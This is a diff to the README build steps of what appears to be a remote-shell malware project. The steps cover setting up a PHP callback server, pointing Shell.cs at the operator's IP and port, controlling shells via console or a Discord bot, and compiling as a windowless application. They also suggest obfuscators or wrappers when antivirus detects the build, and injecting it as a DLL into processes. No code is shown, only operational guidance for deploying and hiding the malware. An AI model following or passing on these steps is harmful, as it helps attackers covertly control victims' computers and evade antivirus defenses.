@@ -30,21 +30,21 @@ Explore the source code 👇🏻
 - At least 3 braincells
 ### Building
 1. First you need a webserver upload [TellMe.php](Server/TellMe.php) there, copy the link
-1. Configure ```update.json```, [more info here](Server/), don't forget to change ShellBind to your own server, you may change it on [the update class](<Client/Communication/JSON Models/Update.cs>) 
-<p align="center">
- <img src="Repo/Images/4.png"/>
-</p> 
-
 1. Set up [the Controller](Controller/)
 1. Change the API endpoint at [Server.cs](Client/Communication/Server.cs) pointing to [TellMe.php](Server/TellMe.php) on **your** server, put the link here
 <p align="center">
  <img src="Repo/Images/0.png"/>
 </p> 
 
-4. **(Optional)** Set up a Discord bot if you want the controller to work on Dicord, else you can just control the shells via console, more info [here!](Controller/README.md)
-5. Compile on Release, not on Debug
-6. Star the repo (important 😉)
-7. **(Optional)** Got detected by AV? Use [an obfuscator](https://github.com/mkaring/ConfuserEx) or better yet, use wrappers
+4. Do the same on [Shell.cs](Armitage/Shell.cs), change the shell endpoint that should point on your server's IP and Port where the [Controller](Controller/) listens
+5. **(Optional)** Set up a Discord bot if you want the controller to work on Dicord, else you can just ontrol the shells via console, more info [here!](Controller/README.md)
+6. Make sure the Output type is Windows Application, you can check this via Project Properties
+<p align="center">
+ <img src="Repo/Images/5.png"/>
+</p> 
+
+7. Star the repo (important 😉)
+8. **(Optional)** Got detected by AV? Use [an obfuscator](https://github.com/mkaring/ConfuserEx) or better yet, use wrappers
 
 As simple as that. You may also compile this as a DLL and inject on processes but that would be your choice.
 # Contributions
